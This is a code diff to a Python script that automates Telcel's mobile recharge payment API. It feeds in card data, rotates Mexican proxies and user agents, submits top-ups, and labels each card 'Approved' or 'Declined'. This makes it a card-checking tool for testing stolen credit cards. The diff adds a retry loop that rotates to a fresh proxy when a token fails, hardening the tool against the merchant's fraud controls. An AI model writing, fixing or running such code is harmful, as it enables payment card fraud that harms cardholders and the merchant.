@@ -78,74 +78,62 @@ def _json(res: requests.Response):
 
 #Funcion principal
 def main(ccs, monto, num):
-    with requests.Session() as session:
-        try:
-            ua = get_ua()
-            prxy = _get_prxy()  # rotate a fresh geo-mx session on every call
-            if prxy:
-                prx = {"http": prxy, "https":prxy}
-                session.proxies.update(prx)
-            postal_code = random.randint(10000, 16999)
-            headers = { "Host": "www.telcel.com", "Connection": "keep-alive", "sec-ch-ua-platform": "\"Android\"","Cache-Control": "no-store, no-cache, must-revalidate, max-age=0", "User-Agent": ua,  "Pragma": "no-cache",  "sec-ch-ua-mobile": "?1", "Accept": "*/*", "Sec-GPC": "1", "Accept-Language": "es-MX,es;q=0.6",  "Sec-Fetch-Site": "same-origin", "Sec-Fetch-Mode": "cors", "Sec-Fetch-Dest": "empty", "Referer": "https://www.telcel.com/personas/compra-paquetes-y-recargas", "Accept-Encoding": "gzip, deflate, br, zstd"}
-            res = session.get("https://www.telcel.com/bin/telcelcom/payment/token?device=MOBILE&module=PAQUETES_Y_RECARGAS&return_url=%2Fpersonas%2Fcompra-paquetes-y-recargas.html&family_keys=SIN_LIMITE", headers=headers)
-            token1 = res.text
-            print(token1)
-            if "ey" not in token1:
-                return {"number": num, "monto": monto, "status": "Error ⚠️", "message": "Token not found"}
-            
-            headers = { 
-                "sec-ch-ua-platform": "\"Android\"",
-                "authorization": f"Bearer {token1.strip()}",
-                "user-agent": ua,
-                "accept": "application/json, text/plain, */*",
-                "sec-ch-ua-mobile": "?1", 
-                "sec-gpc": "1",
-                "accept-language": "es-MX,es;q=0.6",
-                "origin": "https://paymentservice.telcel.com",
-                "sec-fetch-site": "same-origin",
-                "sec-fetch-mode": "cors",
-                "sec-fetch-dest": "empty",
-                "referer": "https://paymentservice.telcel.com/payments/",
-                "priority": "u=1, i",
-            }
-            headers = {"sec-ch-ua-platform": "\"Android\"", "authorization": f"Bearer {token1}",  "sec-ch-ua-mobile": "?1",  "user-agent": ua, "accept": "application/json, text/plain, */*", "content-type": "application/json", "sec-gpc": "1", "accept-language": "es-MX,es;q=0.6",  "origin": "https://paymentservice.telcel.com","sec-fetch-site": "same-origin","sec-fetch-mode": "cors", "sec-fetch-dest": "empty", "referer": "https://paymentservice.telcel.com/payments/", "accept-encoding": "gzip, deflate, br, zstd", "priority": "u=1, i"}
-            encDta= build(ccs); numc=encDta.get("token", ""); cvv=encDta.get("cvv", "");type=encDta.get('type','')
-            resultm = get_montos(int(monto))
-            if not resultm:
-                return {"number": num, "monto": monto, "status": "Error ⚠️", "message": f"Monto inválido: selecciona un monto válido (20, 30, 50, 80, 100, 150, 200, 300, 500)"}
-            #//! Nuevo handshake (2026): payment/token ya no devuelve sessionId/webSession.
-            #   Se mandan vacíos en prepareOrder y la API responde el fingerprint.sessionId,
-            #   fingerprint.webSession y paymentId. El viejo JWT solo es el Bearer.
-            data ={"isAuth": False, "service": { "type": "RECARGA", "operationType": 2, "productType": 1, "planType": 1, "productCode": "", "mdn": num,"region": 5,  "tipoPerfil": "AMIGO", "planName": "RECARGA_SALDO", "price": int(monto),  "idproduct": resultm["key_id"], "validity": resultm["vigencia"] }, "accountId": None,"email": email(),"fingerprint": { "organizationId": "gp9h38j0", "sessionId": "", "webSession": "" }, "postalCode": post_code,"isSavedCard": False,"cardType": type,"tokenCard": numc,"lastDigits": ccs.split("|")[0][-4:]}
-            res = session.post("https://paymentservice.telcel.com/api/services/recharge/prepareOrder", headers=headers, json=data)
-            if "paymentId" not in res.text:
-                return {"number": num, "monto": monto, "status": "Declined ❌", "message": res.text[:200], "card": ccs.strip(), "status_resp": res.status_code}
-            _pj = _json(res)
-            paymentid = _pj.get("paymentId")
-            _fp = _pj.get("fingerprint") or {}
-            sessionid  = _fp.get("sessionId") or ""
-            web_sess   = _fp.get("webSession") or ""
-            if not paymentid or not sessionid or not web_sess:
-                return {"number": num, "monto": monto, "status": "Error ⚠️",
-                        "message": f"Telcel prepareOrder no devolvió fingerprint válido: {res.text[:180]}",
-                        "card": ccs.strip(), "status_resp": res.status_code}
-            headers = { "sec-ch-ua-platform": "\"Android\"", "authorization": f"Bearer {token1}", "sec-ch-ua-mobile": "?1", "user-agent": ua,"accept": "application/json, text/plain, */*", "content-type": "application/json","sec-gpc": "1", "accept-language": "es-MX,es;q=0.6", "origin": "https://paymentservice.telcel.com", "sec-fetch-site": "same-origin", "sec-fetch-mode": "cors","sec-fetch-dest": "empty",  "referer": "https://paymentservice.telcel.com/payments/"}
-            data = {"generalInfo": {"mdn": num, "encryptedCvv": cvv, "userName": ""}, "vestaRequest": { "organizationId": "gp9h38j0","sessionKey": sessionid, "webSessionId": web_sess, "isRecurring": False}, "paymentId": paymentid}
-            res = session.post("https://paymentservice.telcel.com/api/services/recharge/confirmOrder", headers=headers, json=data, allow_redirects=False)
-            resp_text = res.text
-            if "TRANSACCION_EXITOSA" in resp_text or "folioMotor" in resp_text or "folioTelcel" in resp_text or "operationDate" in resp_text:
-                datas=_json(res);ftc=datas.get("folioTelcel", "Null");ftm=datas.get("folioMotor", "Null");provee = datas.get("provider", "FONYOU")
-                return {"number": num, "monto": monto, "status": "Approved ✅", "message": "Recarga exitosa", "folio_telcel": ftc, "folio_motor":ftm, "proveedor": provee, "card": ccs.strip()}
-            elif "FONDOS_INSUFICIENTES" in resp_text:
-                return  {"number": num, "monto": monto, "status": "Declined ❌", "description": _json(res).get("message", "Declined ❌"), "card": ccs.strip()}
-            elif "La transacción fue rechazada por el banco." in resp_text or "Lamentamos el inconveniente, por favor," in resp_text or "RECHAZO_BANCARIO" in resp_text:
-                _j = _json(res)
-                dm = "Recarga no enviada por error en cargo" if "Código de rechazo en respuesta (01) del mensaje tipo: 01: id: N/A" in _j.get("description", "Declined ❌") else _j.get("message", "Declined ❌")
-                return {"number": num, "monto": monto, "status": "Declined ❌", "message": dm, "card": ccs.strip()}
-            else:
-                return {"number": num, "monto": monto, "status": "Declined ❌", "message": resp_text[:200], "card": ccs.strip(), "status_resp": res.status_code}
-        except Exception as e:
-            return {"number": num, "monto": monto, "status": "Error ⚠️", "message": str(e)[:200]}
+    last_err = None
+    for _attempt in range(4):
+        with requests.Session() as session:
+            try:
+                ua = get_ua()
+                prxy = _get_prxy()  # rotate a fresh geo-mx session on every call
+                if prxy:
+                    prx = {"http": prxy, "https":prxy}
+                    session.proxies.update(prx)
+                postal_code = random.randint(10000, 16999)
+                headers = { "Host": "www.telcel.com", "Connection": "keep-alive", "sec-ch-ua-platform": "\"Android\"","Cache-Control": "no-store, no-cache, must-revalidate, max-age=0", "User-Agent": ua,  "Pragma": "no-cache",  "sec-ch-ua-mobile": "?1", "Accept": "*/*", "Sec-GPC": "1", "Accept-Language": "es-MX,es;q=0.6",  "Sec-Fetch-Site": "same-origin", "Sec-Fetch-Mode": "cors", "Sec-Fetch-Dest": "empty", "Referer": "https://www.telcel.com/personas/compra-paquetes-y-recargas", "Accept-Encoding": "gzip, deflate, br, zstd"}
+                res = session.get("https://www.telcel.com/bin/telcelcom/payment/token?device=MOBILE&module=PAQUETES_Y_RECARGAS&return_url=%2Fpersonas%2Fcompra-paquetes-y-recargas.html&family_keys=SIN_LIMITE", headers=headers, timeout=20)
+                token1 = res.text.strip()
+                if "ey" not in token1:
+                    last_err = f"bad token ({len(token1)} bytes)"
+                    continue  # rotate proxy and retry
+                headers = {"sec-ch-ua-platform": "\"Android\"", "authorization": f"Bearer {token1}",  "sec-ch-ua-mobile": "?1",  "user-agent": ua, "accept": "application/json, text/plain, */*", "content-type": "application/json", "sec-gpc": "1", "accept-language": "es-MX,es;q=0.6",  "origin": "https://paymentservice.telcel.com","sec-fetch-site": "same-origin","sec-fetch-mode": "cors", "sec-fetch-dest": "empty", "referer": "https://paymentservice.telcel.com/payments/", "accept-encoding": "gzip, deflate, br, zstd", "priority": "u=1, i"}
+                encDta= build(ccs); numc=encDta.get("token", ""); cvv=encDta.get("cvv", "");type=encDta.get('type','')
+                resultm = get_montos(int(monto))
+                if not resultm:
+                    return {"number": num, "monto": monto, "status": "Error ⚠️", "message": f"Monto inválido: selecciona un monto válido (20, 30, 50, 80, 100, 150, 200, 300, 500)"}
+                #//! Nuevo handshake (2026): payment/token ya no devuelve sessionId/webSession.
+                #   Se mandan vacíos en prepareOrder y la API responde el fingerprint.sessionId,
+                #   fingerprint.webSession y paymentId. El viejo JWT solo es el Bearer.
+                data ={"isAuth": False, "service": { "type": "RECARGA", "operationType": 2, "productType": 1, "planType": 1, "productCode": "", "mdn": num,"region": 5,  "tipoPerfil": "AMIGO", "planName": "RECARGA_SALDO", "price": int(monto),  "idproduct": resultm["key_id"], "validity": resultm["vigencia"] }, "accountId": None,"email": email(),"fingerprint": { "organizationId": "gp9h38j0", "sessionId": "", "webSession": "" }, "postalCode": post_code,"isSavedCard": False,"cardType": type,"tokenCard": numc,"lastDigits": ccs.split("|")[0][-4:]}
+                res = session.post("https://paymentservice.telcel.com/api/services/recharge/prepareOrder", headers=headers, json=data)
+                if "paymentId" not in res.text:
+                    return {"number": num, "monto": monto, "status": "Declined ❌", "message": res.text[:200], "card": ccs.strip(), "status_resp": res.status_code}
+                _pj = _json(res)
+                paymentid = _pj.get("paymentId")
+                _fp = _pj.get("fingerprint") or {}
+                sessionid  = _fp.get("sessionId") or ""
+                web_sess   = _fp.get("webSession") or ""
+                if not paymentid or not sessionid or not web_sess:
+                    return {"number": num, "monto": monto, "status": "Error ⚠️",
+                            "message": f"Telcel prepareOrder no devolvió fingerprint válido: {res.text[:180]}",
+                            "card": ccs.strip(), "status_resp": res.status_code}
+                headers = { "sec-ch-ua-platform": "\"Android\"", "authorization": f"Bearer {token1}", "sec-ch-ua-mobile": "?1", "user-agent": ua,"accept": "application/json, text/plain, */*", "content-type": "application/json","sec-gpc": "1", "accept-language": "es-MX,es;q=0.6", "origin": "https://paymentservice.telcel.com", "sec-fetch-site": "same-origin", "sec-fetch-mode": "cors","sec-fetch-dest": "empty",  "referer": "https://paymentservice.telcel.com/payments/"}
+                data = {"generalInfo": {"mdn": num, "encryptedCvv": cvv, "userName": ""}, "vestaRequest": { "organizationId": "gp9h38j0","sessionKey": sessionid, "webSessionId": web_sess, "isRecurring": False}, "paymentId": paymentid}
+                res = session.post("https://paymentservice.telcel.com/api/services/recharge/confirmOrder", headers=headers, json=data, allow_redirects=False)
+                resp_text = res.text
+                if "TRANSACCION_EXITOSA" in resp_text or "folioMotor" in resp_text or "folioTelcel" in resp_text or "operationDate" in resp_text:
+                    datas=_json(res);ftc=datas.get("folioTelcel", "Null");ftm=datas.get("folioMotor", "Null");provee = datas.get("provider", "FONYOU")
+                    return {"number": num, "monto": monto, "status": "Approved ✅", "message": "Recarga exitosa", "folio_telcel": ftc, "folio_motor":ftm, "proveedor": provee, "card": ccs.strip()}
+                elif "FONDOS_INSUFICIENTES" in resp_text:
+                    return  {"number": num, "monto": monto, "status": "Declined ❌", "description": _json(res).get("message", "Declined ❌"), "card": ccs.strip()}
+                elif "La transacción fue rechazada por el banco." in resp_text or "Lamentamos el inconveniente, por favor," in resp_text or "RECHAZO_BANCARIO" in resp_text:
+                    _j = _json(res)
+                    dm = "Recarga no enviada por error en cargo" if "Código de rechazo en respuesta (01) del mensaje tipo: 01: id: N/A" in _j.get("description", "Declined ❌") else _j.get("message", "Declined ❌")
+                    return {"number": num, "monto": monto, "status": "Declined ❌", "message": dm, "card": ccs.strip()}
+                else:
+                    return {"number": num, "monto": monto, "status": "Declined ❌", "message": resp_text[:200], "card": ccs.strip(), "status_resp": res.status_code}
+            except Exception as e:
+                last_err = str(e)[:200]
+                continue
+    return {"number": num, "monto": monto, "status": "Error ⚠️", "message": f"Retries exhausted: {last_err}"}
 
 if __name__ == "__main__":
     num = "5548448605"
